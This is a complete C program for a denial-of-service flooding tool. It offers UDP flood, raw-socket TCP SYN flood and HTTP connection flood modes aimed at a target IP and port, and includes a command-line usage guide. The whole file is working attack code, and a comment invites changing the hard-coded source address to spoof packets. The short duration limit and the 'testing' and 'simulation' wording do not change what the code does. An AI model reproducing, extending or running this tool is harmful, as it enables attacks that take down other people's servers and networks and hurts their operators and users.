#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>

#define MAX_THREADS     128
#define DEFAULT_PKT_SIZE 1024
#define MAX_PKT_SIZE    8192

// Checksum function (for IP + pseudo-header)
unsigned short checksum(void *buf, int len) {
    unsigned long sum = 0;
    unsigned short *ptr = buf;
    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }
    if (len) sum += *(unsigned char *)ptr;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// UDP flood thread
void *udp_flood(void *arg) {
    char **params = (char **)arg;
    char *target_ip   = params[0];
    int   target_port = atoi(params[1]);
    int   duration    = atoi(params[2]);
    int   pkt_size    = atoi(params[3]);
    int   sock;
    struct sockaddr_in sin;
    char *payload;
    time_t start = time(NULL);

    if (pkt_size < 1 || pkt_size > MAX_PKT_SIZE) pkt_size = DEFAULT_PKT_SIZE;

    payload = malloc(pkt_size);
    if (!payload) return NULL;

    // Fill with random-ish garbage
    for (int i = 0; i < pkt_size; i++) payload[i] = (char)(rand() % 255);

    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) { free(payload); return NULL; }

    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port   = htons(target_port);
    inet_pton(AF_INET, target_ip, &sin.sin_addr);

    printf("[UDP] Sending %d byte packets to %s:%d for %d sec...\n",
           pkt_size, target_ip, target_port, duration);

    while (time(NULL) - start < duration) {
        sendto(sock, payload, pkt_size, 0, (struct sockaddr *)&sin, sizeof(sin));
    }

    close(sock);
    free(payload);
    return NULL;
}

// TCP SYN flood thread
void *syn_flood(void *arg) {
    char **params = (char **)arg;
    char *target_ip   = params[0];
    int   target_port = atoi(params[1]);
    int   duration    = atoi(params[2]);
    int   sock;
    struct sockaddr_in sin;
    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    time_t start = time(NULL);

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Raw socket failed (need root?)");
        return NULL;
    }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port   = htons(target_port);
    inet_pton(AF_INET, target_ip, &sin.sin_addr);

    memset(packet, 0, sizeof(packet));

    iph->ihl      = 5;
    iph->version  = 4;
    iph->tos      = 0;
    iph->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id       = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl      = 64;
    iph->protocol = IPPROTO_TCP;
    inet_pton(AF_INET, "192.168.1.100", &iph->saddr); // CHANGE or randomize if you want spoofing
    inet_pton(AF_INET, target_ip, &iph->daddr);

    tcph->source  = htons(rand() % 65535 + 1024);
    tcph->dest    = htons(target_port);
    tcph->seq     = htonl(rand());
    tcph->doff    = 5;
    tcph->syn     = 1;
    tcph->window  = htons(64240);
    tcph->check   = 0; // will calculate below

    printf("[SYN] Flooding %s:%d for %d sec (spoofing disabled by default)...\n",
           target_ip, target_port, duration);

    while (time(NULL) - start < duration) {
        // Update seq / source port for variety
        tcph->seq    = htonl(rand());
        tcph->source = htons(rand() % 65535 + 1024);

        // Pseudo-header + TCP for checksum
        struct {
            uint32_t src, dst;
            uint8_t zero, proto;
            uint16_t len;
        } pseudo = { iph->saddr, iph->daddr, 0, IPPROTO_TCP, htons(sizeof(struct tcphdr)) };

        char buf[sizeof(pseudo) + sizeof(struct tcphdr)];
        memcpy(buf, &pseudo, sizeof(pseudo));
        memcpy(buf + sizeof(pseudo), tcph, sizeof(struct tcphdr));

        tcph->check = checksum(buf, sizeof(pseudo) + sizeof(struct tcphdr));

        sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&sin, sizeof(sin));
    }

    close(sock);
    return NULL;
}

// L7 HTTP connection flood (aggressive partial GET style)
void *http_flood(void *arg) {
    char **params = (char **)arg;
    char *target_ip   = params[0];
    int   target_port = atoi(params[1]);
    int   duration    = atoi(params[2]);
    time_t start = time(NULL);
    int conns = 0;

    printf("[L7] Opening many HTTP connections to %s:%d for %d sec...\n",
           target_ip, target_port, duration);

    while (time(NULL) - start < duration) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        struct sockaddr_in sin;
        memset(&sin, 0, sizeof(sin));
        sin.sin_family = AF_INET;
        sin.sin_port   = htons(target_port);
        inet_pton(AF_INET, target_ip, &sin.sin_addr);

        if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            close(sock);
            continue;
        }

        // Partial HTTP request — keeps connection open longer on many servers
        char req[] = "GET / HTTP/1.1\r\n"
                     "Host: localhost\r\n"
                     "User-Agent: test-tool\r\n"
                     "Connection: keep-alive\r\n"
                     "Accept: */*\r\n"
                     "\r\n";  // incomplete on purpose in real slow style, but we send fast here

        send(sock, req, strlen(req), 0);

        // You can comment next line if you want pure slowloris style (send 1 header every 10–15s)
        // For testing we just open many connections quickly

        conns++;
        if (conns % 100 == 0) printf("[L7] Opened %d connections...\n", conns);

        usleep(5000); // slight delay to not DoS your own network stack instantly
    }

    printf("[L7] Finished — opened approx %d connections.\n", conns);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage:\n");
        printf("  %s <method> <target_ip> <port> <seconds> <extra>\n", argv[0]);
        printf("Methods:\n");
        printf("  udp       <extra> = packet_size (bytes)\n");
        printf("  syn       <extra> = ignored (or packet count if you modify)\n");
        printf("  http      <extra> = ignored\n");
        printf("\nExample:\n");
        printf("  %s udp 192.168.1.200 80 30 1472\n", argv[0]);
        printf("  %s syn 192.168.1.200 80 20 0\n", argv[0]);
        printf("  %s http 192.168.1.200 80 60 0\n", argv[0]);
        return 1;
    }

    char *method     = argv[1];
    char *target_ip  = argv[2];
    char *port_str   = argv[3];
    char *time_str   = argv[4];
    char *extra      = argv[5];

    int duration = atoi(time_str);
    if (duration < 1 || duration > 300) {
        printf("Duration should be 1–300 seconds for safety.\n");
        return 1;
    }

    srand(time(NULL));

    pthread_t threads[MAX_THREADS];
    char *params[4] = { target_ip, port_str, time_str, extra };

    int num_threads = 8; // adjust depending on your machine (too high = kernel panic)

    if (strcmp(method, "udp") == 0) {
        printf("Starting %d-thread UDP flood...\n", num_threads);
        for (int i = 0; i < num_threads; i++) {
            pthread_create(&threads[i], NULL, udp_flood, params);
        }
    }
    else if (strcmp(method, "syn") == 0) {
        printf("Starting %d-thread SYN flood...\n", num_threads);
        for (int i = 0; i < num_threads; i++) {
            pthread_create(&threads[i], NULL, syn_flood, params);
        }
    }
    else if (strcmp(method, "http") == 0) {
        printf("Starting HTTP connection flood (single thread aggressive mode)...\n");
        http_flood(params); // runs in main thread — blocks until done
        return 0;
    }
    else {
        printf("Unknown method. Use: udp | syn | http\n");
        return 1;
    }

    // Wait for threads
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Attack simulation finished.\n");
    return 0;
}
